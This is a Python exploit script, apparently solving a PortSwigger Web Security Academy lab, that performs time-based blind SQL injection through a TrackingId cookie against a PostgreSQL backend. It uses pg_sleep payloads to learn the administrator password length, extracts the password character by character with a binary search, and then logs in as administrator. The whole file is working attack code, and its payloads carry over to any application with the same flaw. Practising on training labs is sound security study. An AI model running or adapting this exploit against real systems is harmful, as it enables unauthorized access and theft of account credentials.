import requests, sys
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'


def test_cookie(cookie_string):
  """Inject SQL-command onto TrackingId cookie
  Args:
      cookie_string(str): SQL-command injection
  Returns:
      resp.elapsed.total_seconds(float): Total elapsed seconds
  """
  cookie_data = {
    'TrackingId' : cookie_string
  }
  resp = requests.get(url,cookies=cookie_data)
  return(resp.elapsed.total_seconds())



max_length = 1

for num in range(32):
  if test_cookie(f"""x'%3Bselect case when (username = 'administrator' and length(password) = {num}) then pg_sleep(3) else pg_sleep(0) end from users--""") > 3:
    max_length += num
    break


password_list = list('abcdefghijklmnopqrstuvwxyz0123456789')
password = ""
total_elapsed = 0
def binary_search(password, split_left, split_right):
    """Injects a blind-SQL to gain access to administrator's password
    Args:
        password(str): empty string to carry the final password's output
        split_left(list): Half left side of the password_list
        split_right(list): Half right side of the password_list
    Returns:
        char(str): A way to catch the administrator's first character password
        elapsed(float): Catch the elapsed run-time 
    """
    while True:
        # Check left side
        elapsed = test_cookie(f"x'%3Bselect case when (username = 'administrator' and password ~ '^{password}[{''.join(split_left)}]') then pg_sleep(3) else pg_sleep(0) end from users--")
        if elapsed > 3:
            if len(split_left) == 1:
                return split_left[0], elapsed
            middleL = len(split_left) // 2
            left_half = split_left[:middleL]
            right_half = split_left[middleL:]
            split_left = left_half
            split_right = right_half
            continue
        # Check right side
        elapsed = test_cookie(f"x'%3Bselect case when (username = 'administrator' and password ~ '^{password}[{''.join(split_right)}]') then pg_sleep(3) else pg_sleep(0) end from users--")
        if elapsed > 3:
            if len(split_right) == 1:
                return split_right[0], elapsed
            middleR = len(split_right) // 2
            left_half = split_right[:middleR]
            right_half = split_right[middleR:]
            split_left = left_half
            split_right = right_half
            continue
        break
    return None, 0




# Main loop
for i in range(max_length):
    middle = len(password_list) // 2
    split_left = password_list[:middle]
    split_right = password_list[middle:]
    char, elapsed = binary_search(password, split_left, split_right)
    if char:
        password += char
        total_elapsed += elapsed
        print(password)
    else:
        break


print(f"Password: {password}")
print(f"Time Elapsed is {total_elapsed}")



def run_test(login, password):
    """Posts login information onto portswigger
    Args:
        login(str): login username "administrator"
        password(str): login password obtained from binary search function 
    Returns:
        None
    """
    s = requests.Session()
    site = '0a010032037ac83a8688bc4d007100e7.web-security-academy.net/'
    login_url = f'https://{site}/login'


    # Login into wiener
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')

    logindata = {
        'csrf' : csrf,
        'username' : login,
        'password' : password
    }

    resp = s.post(login_url, data=logindata)


run_test('administrator', password)



# linear sequential search
'''
for i in range(1, max_length):
    for candidate in password_list:
        guess = password + candidate
        elapsed = test_cookie(f"x'%3Bselect case when (username = 'administrator' and password ~ '^{guess}') then pg_sleep(3) else pg_sleep(0) end from users--")
        if elapsed > 3:
            password += candidate
            total_elapsed += elapsed
            print(f"{password}")
            break
    else:
        print("No more characters found, stopping.")
        break
''' 
        
#elapsed = test_cookie("x")
#print(f"""Request "x" returned in {elapsed}""")

#elapsed = test_cookie("x' || pg_sleep(3) -- ")
#print(f"""Request "x' || pg_sleep -- " returned in {elapsed}""")
